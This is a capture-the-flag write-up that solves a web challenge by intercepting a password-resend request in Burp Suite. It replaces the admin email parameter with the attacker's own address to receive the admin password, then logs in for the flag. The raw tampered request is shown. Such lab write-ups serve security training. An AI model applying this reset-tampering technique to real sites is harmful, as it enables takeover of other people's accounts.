
# Let me INNNNNN

## Challenge
* Category: Web Security
* Points: 40

Let's see if you can break into our [secure vault](http://challenge.acictf.com:45104/).

### Hints
* How is the email determined for the password resending?


## Solution

### Tools
* Burp Suite

This challenge is no longer available, so we will reconstruct a walkthrough from my notes. 

Ok. Access the Website referenced in secure vault. There is a link to reset password.

We are going to intercept this `POST` request using Burp Suite.

Examine the contents of the `POST` in Burp Suite

```
POST /resend HTTP/1.1
Host: challenge.acictf.com:45114
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge.acictf.com:45114/login.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Connection: close

email=vault.master%40cyberstakes.club
```

Lets change that to our personal email address and forward the request in Burp Suite.


Now go check your personal email.

```
Admin <vault.master@cyberstakes.club>
Fri 4/24/2020 6:29 PM
Admin,

Here is the password to enter the vault.  Do not share this with anyone, enjoy your stay.

PW: 4MYIC21aZw0SeBqN708UnYWdtPb69uqp


http://challenge.acictf.com:45114/admin
```


Follow the link and Login as Admin to get the flag

**ACI{a44af2fa351126dd}**
